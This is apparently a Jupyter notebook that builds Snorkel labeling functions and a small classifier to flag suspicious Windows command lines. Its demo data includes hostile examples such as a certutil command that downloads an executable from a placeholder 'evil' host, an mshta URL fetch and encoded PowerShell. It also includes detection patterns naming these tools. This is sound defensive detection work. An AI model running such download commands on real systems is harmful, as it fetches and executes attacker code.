In [30]:
import sys
print("Kernel Python:", sys.executable)
!"{sys.executable}" -m pip install -U snorkel==0.9.9

Kernel Python: f:\anaconda\python.exe


In [31]:
from snorkel.labeling import labeling_function

ABSTAIN, SUSP, BENIGN = -1, 1, 0

@labeling_function(name="lf_certutil_download")
def lf_certutil_download(x):
    s = (getattr(x, "command_line", "") or "").lower()
    return SUSP if ("certutil" in s and "http" in s) else ABSTAIN

In [32]:
class Evt:
    def __init__(self, command_line): self.command_line = command_line

print(lf_certutil_download(Evt("certutil -urlcache -split -f http://evil/p.exe")))  # => 1 (SUSP)
print(lf_certutil_download(Evt("powershell -enc AAA")))                              # => -1 (ABSTAIN)

1
-1


In [33]:
# Ensure deps and constants
from snorkel.labeling import labeling_function
from snorkel.labeling import PandasLFApplier
from snorkel.labeling import LFAnalysis
import pandas as pd

ABSTAIN, SUSP, BENIGN = -1, 1, 0

In [34]:
# Labeling functions
@labeling_function(name="lf_certutil_download")
def lf_certutil_download(x):
    s = (getattr(x, "command_line", "") or "").lower()
    return SUSP if ("certutil" in s and ("http://" in s or "https://" in s)) else ABSTAIN

@labeling_function(name="lf_mshta_url")
def lf_mshta_url(x):
    s = (getattr(x, "command_line", "") or "").lower()
    return SUSP if ("mshta" in s and ("http://" in s or "https://" in s)) else ABSTAIN

@labeling_function(name="lf_powershell_encoded")
def lf_powershell_encoded(x):
    s = (getattr(x, "command_line", "") or "").lower()
    return SUSP if ("powershell" in s and (" -enc " in s or " -encodedcommand" in s)) else ABSTAIN

@labeling_function(name="lf_word_spawns_ps")
def lf_word_spawns_ps(x):
    parent = (getattr(x, "parent_image", "") or getattr(x, "parent_process", "") or "").lower()
    s = (getattr(x, "command_line", "") or getattr(x, "image", "") or "").lower()
    return SUSP if ("winword" in parent and "powershell" in s) else ABSTAIN

@labeling_function(name="lf_update_benign")
def lf_update_benign(x):
    s = (getattr(x, "command_line", "") or "").lower()
    return BENIGN if ("wuauclt" in s or "windows update" in s or "msconfig" in s) else ABSTAIN

In [35]:
# Demo dataframe (remove if you already have df). Must include a 'command_line' column.
if "df" not in globals() or "command_line" not in getattr(globals().get("df"), "columns", []):
    df = pd.DataFrame([
        {"command_line": r'certutil -urlcache -split -f http://evil/p.exe'},
        {"command_line": r'mshta http://example.com/a.html'},
        {"command_line": r'powershell -enc AAA'},
        {"command_line": r'wuauclt /detectnow'},
        {"command_line": r'cmd /c echo hello'},
    ])

df.head()

,command_line
0,certutil -urlcache -split -f http://evil/p.exe
1,mshta http://example.com/a.html
2,powershell -enc AAA
3,wuauclt /detectnow
4,cmd /c echo hello


In [36]:
# Apply LFs and summarize
lfs = [lf_certutil_download, lf_mshta_url, lf_powershell_encoded, lf_word_spawns_ps, lf_update_benign]
L = PandasLFApplier(lfs).apply(df)
LFAnalysis(L=L, lfs=lfs).lf_summary()

100%|██████████| 5/5 [00:00<00:00, 5008.72it/s]


,j,Polarity,Coverage,Overlaps,Conflicts
lf_certutil_download,0,[1],0.2,0.0,0.0
lf_mshta_url,1,[1],0.2,0.0,0.0
lf_powershell_encoded,2,[1],0.2,0.0,0.0
lf_word_spawns_ps,3,[],0.0,0.0,0.0
lf_update_benign,4,[0],0.2,0.0,0.0


In [ ]:
# Ensure this runs AFTER you created L with PandasLFApplier
from snorkel.labeling.model import LabelModel
import numpy as np
# Sanity checks
assert 'L' in globals(), "Run the LF applier cell first to create L."
L = np.asarray(L, dtype=int)
allowed = {-1, 0, 1}  # ABSTAIN=-1, BENIGN=0, SUSP=1
bad = set(np.unique(L)) - allowed
assert not bad, f"Unexpected labels in L: {bad}"
# Train label model (binary classes: 0=BENIGN, 1=SUSP)
label_model = LabelModel(cardinality=2, verbose=True)
label_model.fit(L_train=L, n_epochs=300, log_freq=100, seed=7)
# Posterior for class 1 (SUSP) and weak label
p_susp = label_model.predict_proba(L)[:, 1]
df["weak_label"] = (p_susp >= 0.5).astype(int)
# Quick summary
df["weak_label"].value_counts()

INFO:root:Computing O...
INFO:root:Estimating \mu...
100%|██████████| 300/300 [00:01<00:00, 248.33epoch/s]
INFO:root:Finished Training


weak_label
1    4
0    1
Name: count, dtype: int64

In [41]:
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression
X = TfidfVectorizer(ngram_range=(1,2), min_df=1).fit_transform(df["command_line"])
clf = LogisticRegression(max_iter=200).fit(X, df["weak_label"])
df["pred"] = clf.predict(X)
print(df[["command_line", "weak_label", "pred"]])

                                     command_line  weak_label  pred
0  certutil -urlcache -split -f http://evil/p.exe           1     1
1                 mshta http://example.com/a.html           1     1
2                             powershell -enc AAA           1     1
3                              wuauclt /detectnow           0     1
4                               cmd /c echo hello           1     1


In [ ]:
from sklearn.metrics import classification_report
print(classification_report(df["weak_label"], df["pred"], digits=3))

              precision    recall  f1-score   support

           0      0.000     0.000     0.000         1
           1      0.800     1.000     0.889         4

    accuracy                          0.800         5
   macro avg      0.400     0.500     0.444         5
weighted avg      0.640     0.800     0.711         5



f:\anaconda\Lib\site-packages\sklearn\metrics\_classification.py:1731: UndefinedMetricWarning: Precision is ill-defined and being set to 0.0 in labels with no predicted samples. Use `zero_division` parameter to control this behavior.
  _warn_prf(average, modifier, f"{metric.capitalize()} is", result.shape[0])
f:\anaconda\Lib\site-packages\sklearn\metrics\_classification.py:1731: UndefinedMetricWarning: Precision is ill-defined and being set to 0.0 in labels with no predicted samples. Use `zero_division` parameter to control this behavior.
  _warn_prf(average, modifier, f"{metric.capitalize()} is", result.shape[0])
f:\anaconda\Lib\site-packages\sklearn\metrics\_classification.py:1731: UndefinedMetricWarning: Precision is ill-defined and being set to 0.0 in labels with no predicted samples. Use `zero_division` parameter to control this behavior.
  _warn_prf(average, modifier, f"{metric.capitalize()} is", result.shape[0])
